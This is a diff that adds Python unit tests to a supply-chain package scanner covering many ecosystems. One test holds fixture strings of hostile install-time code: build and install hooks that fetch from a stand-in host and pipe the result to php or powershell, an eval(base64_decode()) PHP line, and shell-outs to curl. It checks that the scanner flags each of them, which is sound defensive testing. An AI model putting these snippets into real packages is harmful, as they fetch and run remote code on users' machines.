@@ -605,6 +605,143 @@ name = "normalpkg"
         self.assertTrue(payload["matched"])
         self.assertEqual(payload["matches"][0]["advisory_id"], "ADV-1")
 
+    def test_advisory_exact_match_for_supported_ecosystems(self):
+        affected = [
+            {"ecosystem": "crates", "package": "secopsai-fixture-crate", "versions": ["1.2.3"]},
+            {"ecosystem": "chrome-web-store", "package": "fixtureextensionid", "versions": ["4.5.6"]},
+            {"ecosystem": "packagist", "package": "vendor/fixture", "versions": ["1.0.0"]},
+            {"ecosystem": "go", "package": "github.com/example/fixture", "versions": ["v1.2.3"]},
+            {"ecosystem": "huggingface", "package": "secopsai/fixture-model", "versions": ["main"]},
+            {"ecosystem": "maven", "package": "com.example:fixture", "versions": ["2.0.0"]},
+            {"ecosystem": "nuget", "package": "fixture.package", "versions": ["3.0.0"]},
+            {"ecosystem": "open-vsx", "package": "secopsai.fixture", "versions": ["0.1.0"]},
+            {"ecosystem": "rubygems", "package": "fixture_gem", "versions": ["9.9.9"]},
+            {"ecosystem": "pypi", "package": "fixture-pypi", "versions": ["7.0.0"]},
+            {"ecosystem": "npm", "package": "@fixture/pkg", "versions": ["8.0.0"]},
+        ]
+        with tempfile.TemporaryDirectory() as temp_dir:
+            advisory_dir = Path(temp_dir) / "advisories"
+            advisory_dir.mkdir()
+            (advisory_dir / "multi.json").write_text(json.dumps({
+                "advisory_id": "ADV-MULTI",
+                "title": "Multi ecosystem fixture advisory",
+                "status": "active",
+                "affected": affected,
+            }), encoding="utf-8")
+            with mock.patch.object(supply_chain, "ADVISORIES_DIR", advisory_dir):
+                for item in affected:
+                    package_query = (
+                        item["package"]
+                        if item["ecosystem"] in {"go", "huggingface"}
+                        else item["package"].upper()
+                    )
+                    payload = supply_chain.check_advisory(item["ecosystem"], package_query, item["versions"][0])
+                    self.assertTrue(payload["matched"], item)
+                    miss = supply_chain.check_advisory(item["ecosystem"], item["package"], "0.0.1")
+                    self.assertFalse(miss["matched"], item)
+
+    def test_supported_ecosystems_expose_capabilities(self):
+        payload = supply_chain.list_supported_ecosystems()
+        names = {item["ecosystem"] for item in payload["ecosystems"]}
+        for ecosystem in {
+            "crates",
+            "chrome-web-store",
+            "packagist",
+            "go",
+            "huggingface",
+            "maven",
+            "nuget",
+            "open-vsx",
+            "pypi",
+            "rubygems",
+            "npm",
+        }:
+            self.assertIn(ecosystem, names)
+        self.assertTrue(supply_chain.validate_package_identifier("maven", "com.example:fixture")["valid"])
+        self.assertFalse(supply_chain.validate_package_identifier("maven", "fixture")["valid"])
+
+    def test_ecosystem_rules_detect_first_pass_risks(self):
+        cases = {
+            "crates": {
+                "build.rs": 'use std::process::Command; fn main(){ Command::new("curl").arg("https://e.example").status().unwrap(); }',
+            },
+            "chrome-web-store": {
+                "manifest.json": json.dumps({"permissions": ["tabs", "cookies"], "host_permissions": ["<all_urls>"]}),
+            },
+            "packagist": {
+                "composer.json": json.dumps({"scripts": {"post-install-cmd": "curl https://e.example | php"}}),
+                "src/Hook.php": "<?php eval(base64_decode($x));",
+            },
+            "go": {
+                "main.go": 'package main\nimport "os/exec"\nfunc init(){ exec.Command("sh","-c","curl https://e.example").Run() }',
+            },
+            "huggingface": {
+                "config.json": json.dumps({"trust_remote_code": True}),
+                "model.bin": "binary fixture",
+            },
+            "maven": {
+                "pom.xml": "<project><build><plugins><plugin><artifactId>exec-maven-plugin</artifactId></plugin></plugins></build></project>",
+                "src/Main.java": "Runtime.getRuntime().exec(\"curl https://e.example\");",
+            },
+            "nuget": {
+                "tools/install.ps1": "Invoke-WebRequest https://e.example/p.ps1 | powershell",
+            },
+            "open-vsx": {
+                "package.json": json.dumps({"activationEvents": ["*"], "scripts": {"postinstall": "node setup.js"}}),
+                "extension.js": "const cp = require('child_process'); cp.exec('env');",
+            },
+            "rubygems": {
+                "extconf.rb": "require 'open3'; system('curl https://e.example')",
+            },
+        }
+        for ecosystem, files in cases.items():
+            payload = supply_chain.analyze_ecosystem_files(ecosystem, files)
+            self.assertTrue(payload["findings"], ecosystem)
+            self.assertIn(payload["ecosystem"], supply_chain.SUPPORTED_ECOSYSTEM_NAMES)
+
+    def test_explain_verdict_includes_ecosystem_manifest_evidence(self):
+        report = """
+## Ecosystem Findings
+
+- build.rs: crates build.rs install-time execution risk
+- build.rs: crates build.rs environment credential access
+"""
+        payload = supply_chain.explain_verdict(
+            report,
+            ecosystem="crates",
+            package="secopsai-fixture-crate",
+            version="1.2.3",
+        )
+        rules = {rule["rule"] for rule in payload["matched_rules"]}
+        self.assertIn("ecosystem manifest risk", rules)
+
+    def test_non_npm_pypi_scan_reports_clear_limit_without_advisory(self):
+        payload = supply_chain.run_scan(
+            ecosystem="crates",
+            package="secopsai-fixture-crate",
+            version="1.2.3",
+            keep_report=False,
+        )
+        self.assertEqual(payload["result"]["verdict"], "skipped")
+        self.assertIn("artifact fetch unsupported", payload["result"]["error"])
+
+    def test_soc_finding_serializes_non_npm_ecosystem(self):
+        result = supply_chain.ScanResult(
+            ecosystem="maven",
+            package="com.example:fixture",
+            old_version="1.0.0",
+            new_version="1.0.1",
+            verdict="malicious",
+            analysis="Deterministic rules flagged: ecosystem manifest risk",
+            report_path="/tmp/report.md",
+            rank=None,
+            finding_id=supply_chain._finding_id("maven", "com.example:fixture", "1.0.1"),
+        )
+        finding = supply_chain._build_finding(result)
+        self.assertEqual(finding["ecosystem"], "maven")
+        self.assertEqual(finding["package"], "com.example:fixture")
+        self.assertIn("com.example:fixture@1.0.1", finding["title"])
+
     def test_advisory_version_range_match(self):
         with tempfile.TemporaryDirectory() as temp_dir:
             advisory_dir = Path(temp_dir) / "advisories"
